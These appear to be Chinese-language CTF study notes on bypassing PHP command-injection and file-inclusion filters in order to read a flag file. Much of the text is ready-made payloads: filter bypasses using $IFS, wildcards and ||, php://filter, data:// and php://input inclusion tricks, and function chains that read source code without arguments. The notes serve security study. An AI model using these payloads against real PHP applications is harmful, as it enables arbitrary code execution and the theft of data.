## 笔记

<br><br>

* 在逆向(星号)((BYTE*)的时候用宏定义#define BYTE unsigned char即可正常使用

<br>

* system("tac flag.php")用来读取文件内容;

<br>

* ?c=system("tac%20fla(星号)")意思是c=system("tac flag");


````
3.5 通配符绕过

[…]表示匹配方括号之中的任意一个字符
{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。
{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开

````

<br>

* --命令绕过

<br>

黑洞绕过：system($c." >/dev/null 2>&1");

* 双写分号绕过?c=tac f*;ls
* 双写&&绕过?c=tac f*%26%26ls（注：星号被绕过可以用问号）（[0-9]和%的过滤是不会过滤%26之类的）（）
* 带行号绕过?c=nl<fla''g.php%7C%7Cls(此方法可能要右键看源代码)
* 有$的情况下可以重命名flag.php成txt再直接访问:先执行?c=mv${IFS}fla?.php${IFS}a.txt%7C%7Cls 然后使用ls||ls看看有没有命名成功。成功后直接访问a.txt
* 其他注：?c=ls${IFS}/||ls查看根目录（ls /）
* 它只会让分号后面的指令进入黑洞，所以这里直接绕过






<br>

直接eval()传参时：
* 特殊字符:"$""&"如果只是对c进行过滤，就可以通过包含另一个函数来绕过
* 做题前先看看对谁过滤，再看如何过滤
* c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
* c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
* c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
* 仅括号
* c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
* c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
* c=show_source(next(array_reverse(scandir(pos(localeconv())))));
* c=highlight_file(next(array_reverse(scandir(dir))));
<br>

当include(c)时：直接使用协议绕过
* c=data://text/plain,<?php system('tac f*');?>

<br>

* php被过滤的时候:
* ?c=data://text/plain,<?=system("tac fla*")?>
* 注：include()只会处理<?php>里面的内容

<br>

* $被过滤的时候:
* ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
* ?c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");

<br>


````
一般使用方法：

php://filter/ [read|write =]过滤器|过滤器/resource=要过滤的数据流 conversion filter(转换过滤器) convert.base64-encode & convert.base64-decode(base64加密解密) 例如：php://filter/convert.base64-encode/resource=flag.php

过滤器可以设置多个

php://filter读取源代码并进行base64编码输出，例如一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个PHP文件，PHP代码是不会显示到页面上的，例如：

他只显示了一条语句，这时我们可以以base64编码的方式读取指定文件的源码：

php://input协议

input协议可以访问请求的原始数据的制度刘，将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容作为文件内容，从而导致任意代码的执行。

利用该方法，我们可以直接写入php文件，输入file=php://input，然后用burp抓包，写入PHP代码：

data://text/plain协议

同样类似php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行，从而导致任意代码执行。

利用data://伪协议可以直接达到执行php代码的效果，例如执行phpinfo();

格式：data://text/plain,流

例如：

data://text/plain,<?php phpinfo();?>
//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

````




